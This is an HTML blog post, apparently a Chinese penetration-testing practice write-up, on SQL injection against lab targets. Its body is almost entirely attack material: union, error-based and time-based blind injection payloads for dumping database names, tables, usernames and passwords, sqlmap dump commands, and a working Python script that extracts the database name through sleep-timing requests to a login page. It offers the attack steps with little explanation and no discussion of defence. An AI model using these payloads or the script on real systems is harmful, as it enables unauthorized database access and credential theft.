@@ -1,0 +1,1310 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="web,sqli,attack," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="ε&#x3D;(´ο｀*)))唉，太菜了 sql注入都忘完了">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入实战">
+<meta property="og:url" content="https://scerush.github.io/2021/06/21/sql-zhu-ru-shi-zhan/index.html">
+<meta property="og:site_name" content="SCERush">
+<meta property="og:description" content="ε&#x3D;(´ο｀*)))唉，太菜了 sql注入都忘完了">
+<meta property="og:locale">
+<meta property="article:published_time" content="2021-06-21T14:32:58.000Z">
+<meta property="article:modified_time" content="2021-07-03T14:21:46.537Z">
+<meta property="article:author" content="SCERush">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="sqli">
+<meta property="article:tag" content="attack">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://scerush.github.io/2021/06/21/sql-zhu-ru-shi-zhan/"/>
+
+
+
+
+
+  <title>sql注入实战 | SCERush</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">SCERush</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://scerush.github.io/2021/06/21/sql-zhu-ru-shi-zhan/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/blog.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SCERush">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">sql注入实战</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-06-21T22:32:58+08:00">
+                2021-06-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1.6k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  8
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>ε=(´ο｀*)))唉，太菜了</p>
+<p>sql注入都忘完了</p>
+<span id="more"></span>
+<h1 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h1><p><a target="_blank" rel="noopener" href="https://rimovni.exeye.run/hugkudure/well">https://rimovni.exeye.run/hugkudure/well</a></p>
+<pre class="line-numbers language-none"><code class="language-none">1.判断注入
+name&#x3D;1&#39; or 1#
+
+2.判断字段
+name&#x3D;1&#39; order by 5#
+name&#x3D;1&#39; order by 6#
+
+3.union查询
+name&#x3D;-1&#39; union select 1,2,3,4,5#
+
+4.查询数据库、表名
+name&#x3D;-1&#39; union select 1,database(),user(),version(),table_name from information_schema.tables where table_schema&#x3D;&#39;twosecu1_vuln_06&#39; limit 0,1#
+
+5.查询列
+name&#x3D;-1&#39; union select 1,database(),user(),version(),column_name from information_schema.columns where table_schema&#x3D;&#39;twosecu1_vuln_06&#39; and table_name&#x3D;&#39;flag&#39; limit 1,1#
+
+6.查字段
+name&#x3D;-1&#39; union select 1,database(),user(),version(),flag from flag limit 0,2#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p><a target="_blank" rel="noopener" href="https://rimovni.exeye.run/mefe/login">https://rimovni.exeye.run/mefe/login</a></p>
+<pre class="line-numbers language-none"><code class="language-none">1.前段验证邮箱
+email&#x3D;1@1.com
+passwoed&#x3D;1
+
+2.post提交，判断注入
+email&#x3D;1&#39; or 1#&amp;password&#x3D;1
+
+3.判断字段
+email&#x3D;1&#39; order by 3#&amp;password&#x3D;1
+email&#x3D;1&#39; order by 4#&amp;password&#x3D;1
+
+4.报错注入
+email&#x3D;1&#39;&amp;password&#x3D;1
+
+5.爆出数据库
+email&#x3D;1&#39; and updatexml(1,concat(0x7e,database(),0x7e,user()),1)#&amp;password&#x3D;1
+email&#x3D;1&#39; and extractvalue(1,concat(0x7e,user(),0x7e,database()))#&amp;password&#x3D;1
+email&#x3D;1&#39; union select 1,2,3 from (select count(*),concat((select concat(version(),0x7e,database(),0x7e,user()) limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a#&amp;password&#x3D;1
+
+6.爆当前数据库表
+email&#x3D;1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e),1)#&amp;password&#x3D;1
+email&#x3D;1&#39; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e))#&amp;password&#x3D;1
+email&#x3D;1&#39; union select 1,2,3 from (select count(*),concat((select concat(table_name,0x7e)from information_schema.tables where table_schema&#x3D;database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a#&amp;password&#x3D;1
+
+7.爆字段
+email&#x3D;1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;&#39;twosecu1_vuln_08&#39; and table_name&#x3D;&#39;user&#39;),0x7e),1)#&amp;password&#x3D;1
+email&#x3D;1&#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;&#39;twosecu1_vuln_08&#39; and table_name&#x3D;&#39;user&#39;),0x7e))#&amp;password&#x3D;1
+email&#x3D;1&#39; union select 1,2,3 from (select count(*),concat((select concat(column_name,0x7e)from information_schema.columns where table_schema&#x3D;&#39;twosecu1_vuln_08&#39; and table_name&#x3D;&#39;user&#39; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a#&amp;password&#x3D;1
+
+8.爆数据库内容
+email&#x3D;1&#39; and updatexml(1,concat(0x7e,(select group_concat(username,0x7e,password) from twosecu1_vuln_08.user)),1)#&amp;password&#x3D;1
+email&#x3D;1&#39; and extractvalue(1,concat(0x7e,(select group_concat(username,0x7e,password) from twosecu1_vuln_08.user)))#&amp;password&#x3D;1
+email&#x3D;1&#39; union select 1,2,3 from (select count(*),concat((select concat(password,0x7e) from twosecu1_vuln_08.user limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a#&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h1 id="sql语句注入"><a href="#sql语句注入" class="headerlink" title="sql语句注入"></a>sql语句注入</h1><p><a target="_blank" rel="noopener" href="https://rimovni.exeye.run/rodka/index">https://rimovni.exeye.run/rodka/index</a></p>
+<pre class="line-numbers language-none"><code class="language-none">1.爆数据库
+select length(database());
+select substr(database(),1,16);
+
+2.表总数
+select count(table_name) from information_schema.tables where table_schema&#x3D;database();
+
+3.爆数据库表
+select length(table_name) from information_schema.tables where table_schema&#x3D;database() limit 0,1;
+select table_name from information_schema.tables where table_schema &#x3D; database() limit 0,1;
+
+4.爆字段
+select count(column_name) from information_schema.columns where table_name&#x3D;&#39;search&#39;;
+select column_name from information_schema.columns where table_name&#x3D;&#39;search&#39; limit 0,1;
+
+5.爆内容
+select concat(one,&quot;---&quot;,two,&quot;---&quot;,three,&quot;---&quot;,four,&quot;---&quot;,five) from search limit 0,1;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h1 id="union注入-1"><a href="#union注入-1" class="headerlink" title="union注入"></a>union注入</h1><p><a target="_blank" rel="noopener" href="https://rimovni.exeye.run/matihe/index?name=one">https://rimovni.exeye.run/matihe/index?name=one</a></p>
+<pre class="line-numbers language-none"><code class="language-none">python .\sqlmap.py -u https:&#x2F;&#x2F;rimovni.exeye.run&#x2F;matihe&#x2F;index?name&#x3D;one --dbs
+python .\sqlmap.py -u https:&#x2F;&#x2F;rimovni.exeye.run&#x2F;matihe&#x2F;index?name&#x3D;one -D &#39;twosecu1_vuln_04&#39; --tables
+python .\sqlmap.py -u https:&#x2F;&#x2F;rimovni.exeye.run&#x2F;matihe&#x2F;index?name&#x3D;one -D &#39;twosecu1_vuln_04&#39; -T &#39;workbook&#39; --columns
+python .\sqlmap.py -u https:&#x2F;&#x2F;rimovni.exeye.run&#x2F;matihe&#x2F;index?name&#x3D;one -D &#39;twosecu1_vuln_04&#39; -T &#39;workbook&#39; -C &#39;name&#39; --dump
+无法爆出数据，可能是过滤了字符“two”
+借助sqlmap手动payload
+?name&#x3D;-1&#39; union select 1,user(),3,database()-- -
+?name&#x3D;-1&#39; union select 1,user(),3,table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1-- -
+?name&#x3D;-1&#39; union select 1,user(),3,column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;workbook&#39; limit 0,1-- -
+?name&#x3D;-1&#39; union select 1,user(),3,node from workbook limit 5,1-- -<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><p><a target="_blank" rel="noopener" href="https://rimovni.exeye.run/fe/login">https://rimovni.exeye.run/fe/login</a></p>
+<p>本来是没有发现是什么注入的，然后用Acunetix扫了一下，发现它给出的payload可以执行，默认好像都是用的sleep函数来进行测试的，然后猜测这个页面为时间盲注，但是怎么构造也不能执行sleep，于是借用Acunetix的payload进行注入</p>
+<p><code>/*&#39;+(select(0)from(select(sleep(5)))v)+&#39;*/</code></p>
+<p>最后爆出数据库 <code>twosecu1_vuln_07</code> ，数据表 <code>word,use</code> ，字段（两张表一样） <code>id,username,password</code> ，以及数据（word只有一行数据，user好像是无数据） <code>,test,test</code></p>
+<pre class="line-numbers language-none"><code class="language-none">1.爆数据库
+username&#x3D;&quot; &#x2F;*&#39;+(select(1)from(select(sleep(if((length(database())&#x3D;16),5,0))))v)+&#39;*&#x2F;&amp;password&#x3D;1
+username&#x3D;&quot; &#x2F;*&#39;+(select(1)from(select(sleep(if((ORD(mid(database(),1,1))&#x3D;116),5,0))))v)+&#39;*&#x2F;&amp;password&#x3D;1
+twosecu1_vuln_07
+
+2.爆数据库表
+username&#x3D;&quot; &#x2F;*&#39;+(select(1)from(select(sleep(if(((select count(table_name) from information_schema.tables where table_schema&#x3D;&#39;twosecu1_vuln_07&#39;)&#x3D;2),15,0))))v)+&#39;*&#x2F;&amp;password&#x3D;1
+username&#x3D;&quot; &#x2F;*&#39;+(select(1)from(select(sleep(if((length((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))&#x3D;9),15,0))))v)+&#39;*&#x2F;&amp;password&#x3D;1
+username&#x3D;\&quot; *&#39;+(select(1)from(select(sleep(if((ORD(mid(((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())),%d,1))&#x3D;%d),15,0))))v)+&#39;*&#x2F;&amp;password&#x3D;1
+word,user
+
+3.爆字段
+uname &#x3D; &quot;\&quot; &#x2F;*&#39;+(select(1)from(select(sleep(if((ORD(mid(((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;user&#39;)),%d,1))&#x3D;%d),15,0))))v)+&#39;*&#x2F;&quot;&amp;password&#x3D;1
+id,username,password
+
+4.报数据
+uname &#x3D; &quot;\&quot; &#x2F;*&#39;+(select(1)from(select(sleep(if((ORD(mid(((select group_concat(id) from twosecu1_vuln_07.word)),%d,1))&#x3D;%d),15,0))))v)+&#39;*&#x2F;&quot; %(i,j)
+1,test,test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>爆数据库</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> time
+
+<span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span>_username<span class="token punctuation">,</span> _password<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+		<span class="token string">'username'</span><span class="token punctuation">:</span>_username<span class="token punctuation">,</span>
+		<span class="token string">'password'</span><span class="token punctuation">:</span>_password
+	<span class="token punctuation">&#125;</span>
+	url <span class="token operator">=</span> <span class="token string">"https://rimovni.exeye.run/fe/login"</span>
+	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] %s"</span> <span class="token operator">%</span>url<span class="token punctuation">)</span>
+	stime <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
+	response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
+	etime <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
+	tt <span class="token operator">=</span> etime <span class="token operator">-</span> stime
+	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Time: %f"</span> <span class="token operator">%</span>tt<span class="token punctuation">)</span>
+	<span class="token keyword">if</span> tt <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>
+		<span class="token keyword">return</span> <span class="token boolean">True</span>
+	<span class="token keyword">else</span><span class="token punctuation">:</span>
+		<span class="token keyword">return</span> <span class="token boolean">False</span>
+
+<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+	s <span class="token operator">=</span> <span class="token string">""</span>
+	passwd <span class="token operator">=</span> <span class="token string">"1"</span>
+	s_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
+	<span class="token comment"># ss = "_0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"</span>
+	ss <span class="token operator">=</span> <span class="token string">"_0123456789abcdefghijklmnopqrstuvwxyz"</span>
+	<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+		<span class="token comment"># for j in range(33, 127):</span>
+		<span class="token keyword">for</span> j <span class="token keyword">in</span> ss<span class="token punctuation">:</span>
+			uname <span class="token operator">=</span> <span class="token string">"\" /*'+(select(1)from(select(sleep(if((ORD(mid(database(),%d,1))=%d),10,0))))v)+'*/"</span> <span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>
+			<span class="token comment"># print(uname)</span>
+			b <span class="token operator">=</span> login<span class="token punctuation">(</span>uname<span class="token punctuation">,</span>passwd<span class="token punctuation">)</span>
+			<span class="token keyword">if</span> b<span class="token punctuation">:</span>
+				s <span class="token operator">+=</span> j
+				<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] Brup:"</span> <span class="token operator">+</span> s<span class="token punctuation">)</span>
+				<span class="token keyword">break</span>
+	e_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
+	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Total Time: %f"</span> <span class="token operator">%</span><span class="token punctuation">(</span>e_time <span class="token operator">-</span> s_time<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+main<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token comment"># twosecu1_vuln_07</span>
+
+<span class="token comment"># table</span>
+<span class="token comment"># uname = "\" /*'+(select(1)from(select(sleep(if((ORD(mid(((select group_concat(table_name) from information_schema.tables where table_schema=database())),%d,1))=%d),15,0))))v)+'*/" %(i,ord(j))</span>
+
+<span class="token comment"># column</span>
+<span class="token comment"># uname = "\" /*'+(select(1)from(select(sleep(if((ORD(mid(((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='word')),%d,1))=%d),15,0))))v)+'*/" %(i,ord(j))</span>
+
+<span class="token comment"># data</span>
+<span class="token comment"># uname = "\" /*'+(select(1)from(select(sleep(if((ORD(mid(((select username from twosecu1_vuln_07.word limit 0,1)),%d,1))=%d),15,0))))v)+'*/" %(i,j)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web/" rel="tag"><i class="fa fa-tag"></i> web</a>
+          
+            <a href="/tags/sqli/" rel="tag"><i class="fa fa-tag"></i> sqli</a>
+          
+            <a href="/tags/attack/" rel="tag"><i class="fa fa-tag"></i> attack</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/06/14/docker-chang-yong-ming-ling/" rel="next" title="docker常用命令">
+                <i class="fa fa-chevron-left"></i> docker常用命令
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/06/24/xss-yuan-li-ji-fang-yu/" rel="prev" title="XSS原理及防御">
+                XSS原理及防御 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/blog.png"
+                alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">30</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#union%E6%B3%A8%E5%85%A5"><span class="nav-number">1.</span> <span class="nav-text">union注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">2.</span> <span class="nav-text">报错注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sql%E8%AF%AD%E5%8F%A5%E6%B3%A8%E5%85%A5"><span class="nav-number">3.</span> <span class="nav-text">sql语句注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#union%E6%B3%A8%E5%85%A5-1"><span class="nav-number">4.</span> <span class="nav-text">union注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%9B%B2%E6%B3%A8"><span class="nav-number">5.</span> <span class="nav-text">盲注</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">SCERush</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">68.4k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
